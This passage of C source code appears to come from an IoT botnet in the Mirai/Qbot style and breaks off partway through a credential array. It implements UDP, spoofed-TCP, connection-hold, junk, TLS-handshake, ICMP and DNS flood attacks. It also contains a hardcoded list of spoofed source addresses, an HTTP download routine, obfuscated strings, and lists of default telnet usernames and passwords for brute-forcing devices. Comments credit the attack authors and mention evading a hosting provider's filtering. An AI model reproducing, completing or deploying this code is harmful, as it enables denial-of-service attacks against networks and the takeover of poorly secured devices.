/* UDP header as specified by RFC 768, August 1980. */
struct udphdr
{
  uint16_t source;
  uint16_t dest;
  uint16_t len;
  uint16_t check;
};


void sendUDP(unsigned char * target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = HTONS(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  register unsigned int pollRegister;
  pollRegister = pollinterval;

  if (spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (!sockfd) {
      return;
    }

    unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
    if (buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    RandString(buf, packetsize);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, buf, packetsize, 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      if (i == pollRegister) {
        if (port == 0) dest_addr.sin_port = rand_cmwc();
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;
      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (!sockfd) {
      return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
      return;
    }

    int counter = 50;
    while (counter--) {
        srand(time(NULL) ^ rand_cmwc() ^ getpid());
        init_rand(time(NULL) ^ rand_cmwc() ^ getpid());
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr * iph = (struct iphdr *) packet;
    struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, HTONL(GetRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

    udph->len = HTONS(sizeof(struct udphdr) + packetsize);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
    udph->check = 0;

    RandString((unsigned char * )(((unsigned char * ) udph) + sizeof(struct udphdr)), packetsize);

    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      udph->source = rand_cmwc();
      udph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
      iph->id = rand_cmwc();
      iph->saddr = HTONL(GetRandomIP(netmask));
      iph->check = csum((unsigned short * ) packet, iph->tot_len);

      if (i == pollRegister) {
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;

      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  }
}



void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = HTONS(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, HTONL( GetRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, decode("7~~")))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
  } else {
    unsigned char * pch = strtok(flags, "-");
    while (pch) {
      if (!strcmp(pch, decode("6p,"))) {
        tcph->syn = 1;
      } else if (!strcmp(pch, decode("v6c"))) {
        tcph->rst = 1;
      } else if (!strcmp(pch, decode("dx,"))) {
        tcph->fin = 1;
      } else if (!strcmp(pch, decode("7DU"))) {
        tcph->ack = 1;
      } else if (!strcmp(pch, decode("|6e"))) {
        tcph->psh = 1;
      } else {
       return;
      }
      pch = strtok(NULL, ",");
    }
  }


        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : HTONS(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = HTONL( GetRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

int download(char *url, char *saveas) {
    int sock2, i, d;
    struct sockaddr_in serve3r;
    unsigned long ipaddr;
    char buf[1024];
    FILE * file;
    char bufm[4096];
    if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return 3;
    }
    if (!strncmp(url, "http://", 7)) strcpy(buf, url + 7);
    else strcpy(buf, url);
    for (i = 0; i < strlen(buf) && buf[i] != '/'; i++);
    buf[i] = 0;
    serve3r.sin_family = AF_INET;
    serve3r.sin_port = HTONS(80);
    if ((ipaddr = inet_addr(buf)) == -1) {
        struct hostent * hostm;
        if ((hostm = gethostbyname(buf)) == NULL) {
            return 2;
        }
        memcpy((char *)&serve3r.sin_addr, hostm->h_addr, hostm->h_length);
    } else serve3r.sin_addr.s_addr = ipaddr;
    memset(&(serve3r.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr * )&serve3r, sizeof(serve3r)) != 0) {
        return 1;
    }
    sockprintf(sock2, "GET /%s HTTP/1.1\r\n%s-%s: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n", buf + i + 1, buf, decode("1;t="), decode("74tw!"));
    file = fopen(saveas, "wb");
    while (1) {
        int i;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++)
            if (!strncmp(bufm + d, "\r\n\r\n", 4)) {
                for (d += 4; d < i; d++) fputc(bufm[d], file);
                goto downloaded;
            }
    }
    downloaded:
        while (1) {
            int i, d;
            if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
            if (i < 4096) bufm[i] = 0;
            for (d = 0; d < i; d++) fputc(bufm[d], file);
        }
    fclose(file);
    close(sock2);
    return 0;
}
 
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;
 
    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }
 
//    srand(time(NULL)); we already have it initialized in init_rand, also OVH is a bitch and they recognize random numbers generated by time
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
        iph->id = HTONS(54321);
        iph->frag_off = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
}
void setup_udp_header(struct udphdr *udph)
{
    udph->source = HTONS(50000 + rand_cmwc() % 65535);
    udph->dest = HTONS(17015);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x08\x1e\x77\xda", 4);
    udph->len=HTONS(sizeof(struct udphdr) + 4);
}
void pktLd(char *td, int port, int packet_size, int timeEnd) {
	if(listFork()) {return;}
        char datagram[65535];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
 
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = HTONS(port);
        sin.sin_addr.s_addr = inet_addr(td);
 
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
                _exit(-1);
        }
        memset(datagram, 0, 65535);
        setup_ip_header(iph);
        setup_udp_header(udph);
 
 
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
        
        int sport[packet_size];
        unsigned char payload1[packet_size];
        register unsigned int i;
        for(i = 0; i <= packet_size; i++){
                //print_ip(fakeclients[i]); if we debug we use this
                sport[i] = HTONS(randnum(55000,64932));
                payload1[i] = rand_cmwc();
        }
 
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                // fprintf(stdout, "_error_: setsockopt() - Cannot set HDRINCL!\n");
                _exit(-1);
        }
                init_rand(time(NULL));
  //      register unsigned int i;
        i = 0;
 
        int packet_lenght = 0;
        
        int fake_id = 0;
        
                //This is Clay Davis
        unsigned int class[]= {2372231209,2728286747,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879,2734605396,1230980369,3639549962,2728310654,3256452616,3561573700,2918529833,2890221130,2918997764,2453837834,3369835018,3256452681,3007103780,1137178634,3264375402,3229415686,2728310653,3627732067,2890220626,1137178635,3391077889,1745910533,1755074592,16843009,1092011777,3223532318,2918529914,621985916,2728287341,1191626519,2890184316,1822618132,1168895755,3639551498,3455827995,3338431589,3222035998,1731284993,1540078376,3423468322,3254790913,2372224268,2372233305,1822611509,3639550986,2918529633,2890217035,2728286295,2728310634,1488976481,3372614717,3224391454,3223389196,2728329505,1760832002,879920151,3328983856,2728310645,2627363865,2372224322,1499753002,1386562582,875052612,3426605106,2890251825,2728286223,2728310638,2328478534,1822614881,879919113,846476877,3390912871,3238005001,2734604550,1746152824,1539838052,1475895815,1123085431,3639550485,3397779518,3254783489,3223277598,3236292914,2728329249,249627429,1745909765,3339148045,2890217051,1822614887,1746125597,1358538789,839341370,3732673086,3238005000,3221554718,3187841866,2918529910,2542501898,2372224274,1509469200,1121752324,3588504106,3281714501,2372231173,2354214403,1877438500,1746504997,1572678189,1386570514,1123631710,778390842,3562249811,3357634306,3355320065,3352559669,2918529846,2734605379,2728310629,2728292211,2627370561,1822618129,1121752339,879905324,864886835,401541676,3368085770,3281689978,3105469954,2734605380,2637637498,1746667045,1607997226,3226633758,2918529919,2918529639,2890216975,2734605608,2728310642,2627354890,2372224304,2372233499,1482909190,3475901778,3324575748,3221554177,3184129025,2890154342,2728303398,2673421074,2297665372,879919114,3627732078,3639551509,3423468304,3413598005,3355013121,3118228756,2890217308,2890217011,2728310650,2728292214,2627370049,2609248308,2061767504,401285152,3639550474,3544957520,3455828543,3221245464,3187838794,3118228793,2918529872,2609248268,225126924,1566231927,1559430661,1347043330,879905826,3367840010,3108454677,2745962606,2734604397,2734604388,2372226080,1541444905,763183627,3355643150,3234588170,2890217320,2372226403,2328477289,1746667301,1019160141,3455829021,3451508746,3352559679,3223953950,3036312413,2915649581,2728286231,2728295989,2609248267,1746883363,3495166517,3495166005,2728329546,2372226339,2354214404,225179146,1746651228,1755075616,1158721290,1123631699,757107306,3627734829,3588504105,3513807393,3372614671,3234222083,2918529587,2328472852,1822614857,1746651484,1729902934,16777217,1347570977,1249741850,401286176,3451508778,3339924993,3267263505,2890220602,2890217232,2734605610,2734604590,2627354634,2372233317,2061767503,3370514442,3224001822,3223391774,2890153573,2728286564,2609248309,2372231206,1746669130,1746505581,1746018670,1540324867,1490426385,3627734819,3571472426,3389791009,3339754505,3238004997,3224678942,3105432334,2918529646,2501132291,2372226408,2372233487,2372233333,1746505837,2916403734,2890153763,2609247813,2372231196,1822614893,1122525959,879894536,610792735,3588503850,3494790672,3350508607,3302533386,1572396061,1046910020,1039029042,778432376,679348486,3281684007,2728310635,2319739454,225126923,1822614869,1822614791,1390242054,1185293895,3629619233,3639549973,3356113973,3258558721,3224793118,3113151523,2918529907,2734605395,2728310655,1746669386,2734604591,2728310636,1760832065,1539137028,2728329756,2372231208,2372224328,879905323,675544612,634503170,3494653237,3162044975,3113716993,2919228438,2728310575,1054006394,3339146026,3339925761,3224087582,2328461595,225117528,1746152568,1092011009,879894535,97447234,3251539246,3223622673,3118228768,2728310632,2372233584,3627734830,3355643147,3339142145,3228574724,3221245453,2890152495,2734604396,2728310647,1822617914,1822612837,1494642712,3562246432,3238004993,3109164125,2745964819,2372231174,2264919306,1822617962,3647724345,3328294453,3224851230,3221245452,2728310599,2673449270,2609248307,2540009556,2372226378,1998378804,1745910021,879905827,676177781,3629620001,3254789121,3118786598,3113151522,2918529642,2728282915,1822617878,1746018414,1123077410,401541708,3339924737,2453837835,2151612981,1347928371,1249741851,2728286267,2734604551,2728286303,2372226052,3390923303,2734604389,1877351697,1475895816,2372231186,3663327556,3221245216,3639550997,3413595749,3252515125,2609247812,2372231207,2372226334,1746373394,3350509109,2372231195,3562380810,2918997773,3323221858,2918529663,2016704517,1475395139,1123631109,3238004999,1389915980,95573855,3238004998,3221245186,3118228769,3118228770,3225059358,3256452680,1779203355,1746883107,1760832066,1585621764,3222952990,3627734826};
        
    int end = time(NULL) + timeEnd;
    register unsigned int ii = 0;
	
        while(1){
 
                iph->saddr = HTONL(class[rand_cmwc()%431]);
                udph->source = HTONS(sport[randnum(0,packet_size)]);
                
                packet_lenght = randnum(500, packet_size);
                int fake_id = rand_cmwc() & 0xFFFFFFFF;
                iph->id = HTONL(fake_id);
                
                memcpy((void *)udph + sizeof(struct udphdr), payload1, packet_lenght);
                udph->len=HTONS(sizeof(struct udphdr) + packet_lenght);
                
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packet_lenght;
                iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

        }
}

void pktSend(char *td, int port, int packet_size, int num_threads, int timeEnd) {

        int i;
        for(i = 0;i<num_threads;i++){
                pktLd(td, port, packet_size, timeEnd);
        }
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHLD(unsigned char *ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip,&dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL,&myset, NULL,&tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, NULL,&myset,&tv);
                    if (res != 0) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

int realrand(int low, int high) {
    srand(time(NULL) ^ rand_cmwc() ^ getpid());
    return (rand() % (high + 1 - low) + low);
}

void rndBytes(unsigned char *buf, int length) {
    srand(time(NULL) ^ rand_cmwc() ^ getpid());
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 255) + 1;
}


void rand_str(char *dest, size_t length) {
    char charset[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    while (length-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof charset - 1);
        *dest++ = charset[index];
    }
    *dest = '\0';
}

void sendJNK(unsigned char * ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char * pakt = malloc(1024);
    memset(pakt, 0, 1024);
    int packetLen = 1024;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //nonblocking sweg
                    packetLen = realrand(64, 1432);
                    rndBytes(pakt, packetLen);
                    if (send(fds[i].fd, pakt, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}
void sendTLS(unsigned char * ip, int port, int end_time) { //TLS ATTACK CODED BY FREAK

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = HTONS(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;


    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 20000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //TLS ATTACK CODED BY FREAK
                    if (send(fds[i].fd, "\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x00\x00\x20\xcc\xa8\xcc\xa9\xc0\x2f\xc0\x30\xc0\x2b\xc0\x2c\xc0\x13\xc0\x09\xc0\x14\xc0\x0a\x00\x9c\x00\x9d\x00\x2f\x00\x35\xc0\x12\x00\x0a\x01\x00\x00\x58\x00\x00\x00\x18\x00\x16\x00\x00\x13\x65\x78\x61\x6d\x70\x6c\x65\x2e\x75\x6c\x66\x68\x65\x69\x6d\x2e\x6e\x65\x74\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\x0a\x00\x0a\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\x0d\x00\x12\x00\x10\x04\x01\x04\x03\x05\x01\x05\x03\x06\x01\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00", 170, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        //close(fds[i].fd); NEVER CLOSE SOCKET
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}


void bnrse(char *host, int secs) {
    uint8_t pkt_template[] = {
        0x03,
        0x03,
        0x0d,
        0x33,
        0x00,
        0x00,
        0x00,
        0x00,
        0x45,
        0x00,
        0x00,
        0x1c,
        0x4a,
        0x04,
        0x00,
        0x00,
        0x40,
        0x06,
        0x20,
        0xc5,
        0x01,
        0x02,
        0x03,
        0x04,
        0x05,
        0x06,
        0x07,
        0x08,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x08,
        0xef,
        0xc1
    };
    uint8_t * pkt;
    struct addrinfo * ai, hints;
    struct pollfd pfd;
    const size_t pkt_len = (sizeof pkt_template) / (sizeof pkt_template[0]);
    size_t i;
    int gai_err;
    int kindy;
    int x, get;

    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) _exit(1);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    if ((gai_err = getaddrinfo(host, NULL,&hints,&ai)) != 0) {
        _exit(1);
    }
    if ((kindy = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        _exit(1);
    }
    pkt = pkt_template;
    pfd.fd = kindy;
    pfd.events = POLLOUT;
    int end = time(NULL) + secs;
    for (;;) {
        for (i = 20; i < 20 + 8 + 4; i++) {
            pkt[i] = (uint8_t) rand();
        }
        if (sendto(kindy, pkt, pkt_len, 0,
                ai->ai_addr, ai->ai_addrlen) != (ssize_t) pkt_len) {
            if (errno == ENOBUFS) {
                poll(&pfd, 1, 1000);
                continue;
            }
            break;
        }
        if (i >= 100) {
            if (time(NULL) > end) {
                _exit(0);
            }
            x = 0;
        }
        x++;
    }
    /* NOTREACHED */
    close(kindy);
    freeaddrinfo(ai);

    return;
}

	void DNSw(unsigned char *ip, int port, int secs)
	{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	if(port == 0) { 
				sin.sin_port = realrand(49152, 65535);
	} else {
	sin.sin_port = port;
	}
	unsigned int a = 0;//Made By Zinqo.
	char rhexstring[128];
    char *rhexstrings[] = {
        "%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
        "%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04\x6c\x69\x76\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x6f\x66\x66\x69\x63\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x64\x69\x67\x69\x6b\x61\x6c\x61\x03\x63\x6f\x6d\x00\x00\xff\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0a\x73\x61\x6c\x65\x73\x66\x6f\x72\x63\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05\x73\x6f\x67\x6f\x75\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x64\x69\x73\x63\x6f\x72\x64\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x77\x69\x6b\x69\x68\x6f\x77\x03\x63\x6f\x6d\x00\x00\x10\x00\x01",
"%s%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0e\x6d\x61\x6e\x6f\x72\x61\x6d\x61\x6f\x6e\x6c\x69\x6e\x65\x03\x63\x6f\x6d\x00\x00\xff\x00\x01",


        };//Made By Freak
    int count = NUMITEMS(rhexstrings);
	while(1)
	{
       
		if (a >= 50)
		{
			if(port == 0) { 
				sin.sin_port = realrand(49152, 65535);
			}
            memset(rhexstring, 0, 128);
			sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);
			send(std_hex, rhexstring, strlen(rhexstring), 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}

int j83jPid = 0;


char * usernames[] = {
    "\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "root\0",
    "admin\0",
    "root\0",
    "default\0",
    "user\0",
    "guest\0",
    "daemon\0",
    "admin\0",
    "admin\0",
    "root\0",
    "admin\0",
    "adm\0",
    "guest\0",
    "root\0",
    "root\0",
    "telnet\0",
    "root\0",
    "admin\0",
    "admin\0",
    "Administrator\0",
    "root\0",
    "mg3500\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "default\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin1\0",
    "ubnt\0",
    "support\0",
    "root\0",
    "user\0",
    "guest\0"
};

char * passwords[] = {
    "\0",
    "root\0",
    "password\0",
    "\0",
    "Zte521\0",
    "vizxv\0",
    "000000\0",
    "14567\0",
    "hi3518\0",
    "user\0",
    "pass\0",
    "admin14\0",
    "7ujMko0admin\0",
    "00000000\0",
    "<>\0",
    "klv1\0",
    "klv14\0",
    "oelinux1\0",
    "realtek\0",
